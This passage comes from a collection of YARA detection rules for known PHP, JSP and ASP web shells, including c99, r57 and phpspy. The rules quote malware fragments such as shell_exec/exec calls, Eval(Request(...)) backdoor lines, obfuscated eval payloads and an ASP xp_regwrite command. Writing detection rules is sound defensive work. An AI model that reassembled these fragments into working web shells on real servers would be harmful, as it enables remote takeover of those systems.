		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "8b457934da3821ba58b06a113e0d53d9"
		hash3 = "d44df8b1543b837e57cc8f25a0a68d92"
		hash4 = "e0354099bee243702eb11df8d0e046df"
		hash5 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash6 = "655722eaa6c646437c8ae93daac46ae0"
		hash7 = "591ca89a25f06cf01e4345f98a22845c"

	strings:
		$s0 = "return new Double(format.format(value)).doubleValue();" fullword
		$s5 = "File tempF = new File(savePath);" fullword
		$s9 = "if (tempF.isDirectory()) {" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_C99_C99Shell_C99_C99Shell {
    meta:
		description = "Web Shell - from files c99.php, c99shell.php, c99.php, c99shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2931-L2949"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "b999b1a8307e228fb97772799369e292fb806d614159f2b2abfc7a71c5bdb225"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
		hash1 = "d3f38a6dc54a73d304932d9227a739ec"
		hash2 = "157b4ac3c7ba3a36e546e81e9279eab5"
		hash3 = "048ccc01b873b40d57ce25a4c56ea717"

	strings:
		$s2 = "$bindport_pass = \"c99\";" fullword
		$s5 = " else {echo \"<b>Execution PHP-code</b>\"; if (empty($eval_txt)) {$eval_txt = tr"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_R57Shell127_R57_Ifx_R57_Kartal_R57_Antichat {
    meta:
		description = "Web Shell - from files r57shell127.php, r57_iFX.php, r57_kartal.php, r57.php, antichat.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2950-L2971"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "23887963068f7dd2e4c85b11079276a00786d1a753f22e3b63f01139087a7f4c"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "ae025c886fbe7f9ed159f49593674832"
		hash1 = "513b7be8bd0595c377283a7c87b44b2e"
		hash2 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash3 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash4 = "3f71175985848ee46cc13282fbed2269"

	strings:
		$s6 = "$res   = @mysql_query(\"SHOW CREATE TABLE `\".$_POST['mysql_tbl'].\"`\", $d"
		$s7 = "$sql1 .= $row[1].\"\\r\\n\\r\\n\";" fullword
		$s8 = "if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }" fullword
		$s9 = "foreach($values as $k=>$v) {$values[$k] = addslashes($v);}" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_NIX_REMOTE_WEB_SHELL_Nstview_Xxx {
    meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2972-L2991"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "b10e89c6b1851f88a2bbb9116969ea3770366c162b911cb8a2c3a033da3a46bc"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "0b19e9de790cd2f4325f8c24b22af540"
		hash1 = "4745d510fed4378e4b1730f56f25e569"
		hash2 = "f3ca29b7999643507081caab926e2e74"
		hash3 = "46a18979750fa458a04343cf58faa9bd"

	strings:
		$s3 = "BODY, TD, TR {" fullword
		$s5 = "$d=str_replace(\"\\\\\",\"/\",$d);" fullword
		$s6 = "if ($file==\".\" || $file==\"..\") continue;" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_000_403_807_A_C5_Config_Css_Dm_He1P_Xxx {
    meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2992-L3042"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "46eede3a1af29e344ed5107fc0af4bd13cd1492bff340d61063911bbb474e7b3"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
		hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
		hash4 = "8b457934da3821ba58b06a113e0d53d9"
		hash5 = "d44df8b1543b837e57cc8f25a0a68d92"
		hash6 = "fc44f6b4387a2cb50e1a63c66a8cb81c"
		hash7 = "14e9688c86b454ed48171a9d4f48ace8"
		hash8 = "b330a6c2d49124ef0729539761d6ef0b"
		hash9 = "d71716df5042880ef84427acee8b121e"
		hash10 = "341298482cf90febebb8616426080d1d"
		hash11 = "29aebe333d6332f0ebc2258def94d57e"
		hash12 = "42654af68e5d4ea217e6ece5389eb302"
		hash13 = "88fc87e7c58249a398efd5ceae636073"
		hash14 = "4a812678308475c64132a9b56254edbc"
		hash15 = "9626eef1a8b9b8d773a3b2af09306a10"
		hash16 = "e0354099bee243702eb11df8d0e046df"
		hash17 = "344f9073576a066142b2023629539ebd"
		hash18 = "32dea47d9c13f9000c4c807561341bee"
		hash19 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash20 = "655722eaa6c646437c8ae93daac46ae0"
		hash21 = "b9744f6876919c46a29ea05b1d95b1c3"
		hash22 = "6acc82544be056580c3a1caaa4999956"
		hash23 = "6aa32a6392840e161a018f3907a86968"
		hash24 = "591ca89a25f06cf01e4345f98a22845c"
		hash25 = "349ec229e3f8eda0f9eb918c74a8bf4c"
		hash26 = "3ea688e3439a1f56b16694667938316d"
		hash27 = "ab77e4d1006259d7cbc15884416ca88c"
		hash28 = "71097537a91fac6b01f46f66ee2d7749"
		hash29 = "2434a7a07cb47ce25b41d30bc291cacc"
		hash30 = "7a4b090619ecce6f7bd838fe5c58554b"

	strings:
		$s3 = "String savePath = request.getParameter(\"savepath\");" fullword
		$s4 = "URL downUrl = new URL(downFileUrl);" fullword
		$s5 = "if (Util.isEmpty(downFileUrl) || Util.isEmpty(savePath))" fullword
		$s6 = "String downFileUrl = request.getParameter(\"url\");" fullword
		$s7 = "FileInputStream fInput = new FileInputStream(f);" fullword
		$s8 = "URLConnection conn = downUrl.openConnection();" fullword
		$s9 = "sis = request.getInputStream();" fullword

	condition:
		4 of them
}
rule SIGNATURE_BASE_Webshell_2_520_Icesword_Job_Ma1 {
    meta:
		description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3043-L3063"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "795eb586310d87a3c6b53117bf2c8cbcfadcb177f5a5129c17fd21f0b64c385c"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "64a3bf9142b045b9062b204db39d4d57"
		hash1 = "9abd397c6498c41967b4dd327cf8b55a"
		hash2 = "077f4b1b6d705d223b6d644a4f3eebae"
		hash3 = "56c005690da2558690c4aa305a31ad37"
		hash4 = "532b93e02cddfbb548ce5938fe2f5559"

	strings:
		$s1 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"></head>" fullword
		$s3 = "<input type=\"hidden\" name=\"_EVENTTARGET\" value=\"\" />" fullword
		$s8 = "<input type=\"hidden\" name=\"_EVENTARGUMENT\" value=\"\" />" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_404_Data_In_Jfolder_Jfolder01_Jsp_Suiyue_Warn {
    meta:
		description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, suiyue.jsp, warn.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3064-L3088"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "5e0da29499d76539fb1f5cfbe0a00331eeb0bb8fa861f2e2d686130ee4939fac"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "7066f4469c3ec20f4890535b5f299122"
		hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
		hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
		hash3 = "8979594423b68489024447474d113894"
		hash4 = "ec482fc969d182e5440521c913bab9bd"
		hash5 = "f98d2b33cd777e160d1489afed96de39"
		hash6 = "c93d5bdf5cf62fe22e299d0f2b865ea7"
		hash7 = "e9a5280f77537e23da2545306f6a19ad"

	strings:
		$s0 = "<table width=\"100%\" border=\"1\" cellspacing=\"0\" cellpadding=\"5\" bordercol"
		$s2 = " KB </td>" fullword
		$s3 = "<table width=\"98%\" border=\"0\" cellspacing=\"0\" cellpadding=\""
		$s4 = "<!-- <tr align=\"center\"> " fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Phpspy_2005_Full_Phpspy_2005_Lite_Phpspy_2006_PHPSPY {
    meta:
		description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, PHPSPY.php"
		author = "Florian Roth (Nextron Systems)"
		id = "41a0560a-b22e-5028-8ad1-710c5758cb1d"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3090-L3110"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "fc47a50c5964574fb9b9caf3fb94041f028998577bf4ccf21884a41fa1876572"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "b68bfafc6059fd26732fa07fb6f7f640"
		hash1 = "42f211cec8032eb0881e87ebdb3d7224"
		hash2 = "40a1f840111996ff7200d18968e42cfe"
		hash3 = "0712e3dc262b4e1f98ed25760b206836"

	strings:
		$s4 = "http://www.4ngel.net" fullword
		$s5 = "</a> | <a href=\"?action=phpenv\">PHP" fullword
		$s8 = "echo $msg=@fwrite($fp,$_POST['filecontent']) ? \"" fullword
		$s9 = "Codz by Angel" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_C99_Locus7S_C99_W4Cking_Xxx {
    meta:
		description = "Web Shell"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3111-L3140"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "4afadac41e729f77711eb3ea3ee8f6e8ce61e19294e90db024e5334e214d9647"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "38fd7e45f9c11a37463c3ded1c76af4c"
		hash1 = "9c34adbc8fd8d908cbb341734830f971"
		hash2 = "ef43fef943e9df90ddb6257950b3538f"
		hash3 = "ae025c886fbe7f9ed159f49593674832"
		hash4 = "911195a9b7c010f61b66439d9048f400"
		hash5 = "697dae78c040150daff7db751fc0c03c"
		hash6 = "513b7be8bd0595c377283a7c87b44b2e"
		hash7 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash8 = "e5b2131dd1db0dbdb43b53c5ce99016a"
		hash9 = "4108f28a9792b50d95f95b9e5314fa1e"
		hash10 = "b8f261a3cdf23398d573aaf55eaf63b5"
		hash11 = "0d2c2c151ed839e6bafc7aa9c69be715"
		hash12 = "41af6fd253648885c7ad2ed524e0692d"
		hash13 = "6fcc283470465eed4870bcc3e2d7f14d"

	strings:
		$s1 = "$res = @shell_exec($cfe);" fullword
		$s8 = "$res = @ob_get_contents();" fullword
		$s9 = "@exec($cfe,$res);" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Browser_201_3_Ma_Ma2_Download {
    meta:
		description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, ma2.jsp, download.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3141-L3162"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "3b8bb6ca2eb146f8c170d629612ba12d4663445d443b681f2859af25d50ab6fe"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "37603e44ee6dc1c359feb68a0d566f76"
		hash1 = "a7e25b8ac605753ed0c438db93f6c498"
		hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
		hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
		hash4 = "4b45715fa3fa5473640e17f49ef5513d"
		hash5 = "fa87bbd7201021c1aefee6fcc5b8e25a"

	strings:
		$s1 = "private static final int EDITFIELD_ROWS = 30;" fullword
		$s2 = "private static String tempdir = \".\";" fullword
		$s6 = "<input type=\"hidden\" name=\"dir\" value=\"<%=request.getAttribute(\"dir\")%>\""

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_000_403_C5_Querydong_Spyjsp2010 {
    meta:
		description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3163-L3184"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "dd01bb059d741fedaee17d46355c7cd8a845d714b20ae37db36424544b954d2f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "2eeb8bf151221373ee3fd89d58ed4d38"
		hash1 = "059058a27a7b0059e2c2f007ad4675ef"
		hash2 = "8b457934da3821ba58b06a113e0d53d9"
		hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
		hash4 = "655722eaa6c646437c8ae93daac46ae0"

	strings:
		$s2 = "\" <select name='encode' class='input'><option value=''>ANSI</option><option val"
		$s7 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</spa"
		$s8 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName("
		$s9 = "((Invoker)ins.get(\"vd\")).invoke(request,response,JSession);" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_R57Shell127_R57_Kartal_R57 {
    meta:
		description = "Web Shell - from files r57shell127.php, r57_kartal.php, r57.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3185-L3203"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "fd849f76f8348ee57a9c96eed91c8cac416fdc45a08c93e93ebc952375de27a3"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "ae025c886fbe7f9ed159f49593674832"
		hash1 = "1d912c55b96e2efe8ca873d6040e3b30"
		hash2 = "4108f28a9792b50d95f95b9e5314fa1e"

	strings:
		$s2 = "$handle = @opendir($dir) or die(\"Can't open directory $dir\");" fullword
		$s3 = "if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }" fullword
		$s5 = "if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_"

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Webshells_New_Con2 {
    meta:
		description = "Web shells - generated from file con2.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3205-L3219"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d3584159ab299d546bd77c9654932ae3"
		logic_hash = "c681b04a1ee4d6af3275b6d772ef35f8bc888a5fcaf3b84f29f77c264e8ad9b9"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = ",htaPrewoP(ecalper=htaPrewoP:fI dnE:0=KOtidE:1 - eulaVtni = eulaVtni:nehT 1 => e"
		$s10 = "j \"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'><input n"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Webshells_New_Make2 {
    meta:
		description = "Web shells - generated from file make2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3220-L3233"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "9af195491101e0816a263c106e4c145e"
		logic_hash = "7c94c925b5fd7fbc37428c21a9ea3c5a73f4fa0a20a1f5d03f0d5a990bd6f45a"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "error_reporting(0);session_start();header(\"Content-type:text/html;charset=utf-8"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Webshells_New_Aaa {
    meta:
		description = "Web shells - generated from file aaa.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3234-L3249"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "68483788ab171a155db5266310c852b2"
		logic_hash = "3c5b9dd86dc790b03a8540b2fb3a717c5ad17d34f366a319faa127479387eed9"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Function fvm(jwv):If jwv=\"\"Then:fvm=jwv:Exit Function:End If:Dim tt,sru:tt=\""
		$s5 = "<option value=\"\"DROP TABLE [jnc];exec mast\"&kvp&\"er..xp_regwrite 'HKEY_LOCAL"
		$s17 = "if qpv=\"\" then qpv=\"x:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\"&br&"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Expdoor_Com_ASP {
    meta:
		description = "Web shells - generated from file Expdoor.com ASP.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3250-L3267"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "caef01bb8906d909f24d1fa109ea18a7"
		logic_hash = "838edb9d718b5e1a8be155c4569b4a291b37337e71b435c2b1cd6bcaa53c0dea"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "\">www.Expdoor.com</a>" fullword
		$s5 = "    <input name=\"FileName\" type=\"text\" value=\"Asp_ver.Asp\" size=\"20\" max"
		$s10 = "set file=fs.OpenTextFile(server.MapPath(FileName),8,True)  '" fullword
		$s14 = "set fs=server.CreateObject(\"Scripting.FileSystemObject\")   '" fullword
		$s16 = "<TITLE>Expdoor.com ASP" fullword

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Webshells_New_Php2 {
    meta:
		description = "Web shells - generated from file php2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3268-L3281"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "fbf2e76e6f897f6f42b896c855069276"
		logic_hash = "0350df076a25af77fbd8d5db2b38438a10cd5b9237b23b2f64c6360607b41982"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php $s=@$_GET[2];if(md5($s.$s)=="

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Bypass_Iisuser_P {
    meta:
		description = "Web shells - generated from file bypass-iisuser-p.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3282-L3295"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "924d294400a64fa888a79316fb3ccd90"
		logic_hash = "60d0609291e5def26ce949c903ac767db4157b4f9cf4eee315c69ee7a8d8e77b"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%Eval(Request(chr(112))):Set fso=CreateObject"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Sig_404Super {
    meta:
		description = "Web shells - generated from file 404super.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3296-L3314"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "7ed63176226f83d36dce47ce82507b28"
		logic_hash = "01ecffc6bca2acf1ea4f4d965f3513f7b08ee3d5abbda29d53081f2931ecf9e9"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "$i = pack('c*', 0x70, 0x61, 99, 107);" fullword
		$s6 = "    'h' => $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631')," fullword
		$s7 = "//http://require.duapp.com/session.php" fullword
		$s8 = "if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}" fullword
		$s12 = "//define('pass','123456');" fullword
		$s13 = "$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSIO"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Webshells_New_JSP {
    meta:
		description = "Web shells - generated from file JSP.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3315-L3330"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "495f1a0a4c82f986f4bdf51ae1898ee7"
		logic_hash = "bcb2f5d16ff3cc1454bf4653defe037e02a9228a5b7cf7428b1a577f4207c3c8"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i"
		$s5 = "bw.write(z2);bw.close();sb.append(\"1\");}else if(Z.equals(\"E\")){EE(z1);sb.app"
		$s11 = "if(Z.equals(\"A\")){String s=new File(application.getRealPath(request.getRequest"

	condition:
		1 of them
}
rule SIGNATURE_BASE_Webshell_Webshell_123 {
    meta:
		description = "Web shells - generated from file webshell-123.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-01-27"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L3331-L3348"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "2782bb170acaed3829ea9a04f0ac7218"
		logic_hash = "1caccadf2bd7d265f9b5026c82acc31ade95313d57382651004db8b5e361312d"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "// Web Shell!!" fullword
		$s1 = "@preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6"
		$s3 = "$default_charset = \"UTF-8\";" fullword
		$s4 = "// url:http://www.weigongkai.com/shell/"

	condition:
		2 of them
}
